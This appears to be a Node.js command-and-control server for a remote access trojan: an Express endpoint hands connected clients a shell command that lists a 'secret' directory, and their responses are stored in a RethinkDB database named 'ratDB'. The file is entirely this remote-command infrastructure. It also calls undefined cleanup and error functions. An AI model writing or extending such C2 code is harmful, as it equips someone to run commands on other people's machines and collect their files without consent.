var app = require("express")();
var http = require("http").Server(app);
var bodyParser = require("body-parser");
var r = require("rethinkdb");

// define what my database and table are
var myDB = r.db("ratDB").table("clientResponses");
var connection = null;

app.use(bodyParser.json());

// define the command we want to execute
var command = "ls -a /home/nitrous/secret";

// listen for any gets, return the command
app.get("/api", function(req, res){
  res.json({command: command});
});

// listen for any posts
app.post("/", function (req, res) {
  
  // log out the request body
  console.log(req.body);
  
  // connect to the database
  r.connect( {host: "localhost", port: 28015}, function(err, conn) {
      if (err) throw err;
      connection = conn;
      conn.addListener("error", function(e) {
          processNetworkError(e);
      });

      conn.addListener("close", function() {
          cleanup();
      });
      // call insert response
      insertResponse(conn);
  });

  // inser response from the client and the command into the database
  function insertResponse() {
    myDB.insert({
      "Command" : command,
      "Response" : req.body
    }).run(connection);
  };
  
  // send a message back to the client saying the post has been received with a timestamp
  res.send("Post has been received " + new Date());
})

// listen on port 3000
http.listen(3000, function(){
  console.log("listening on *:3000");
});
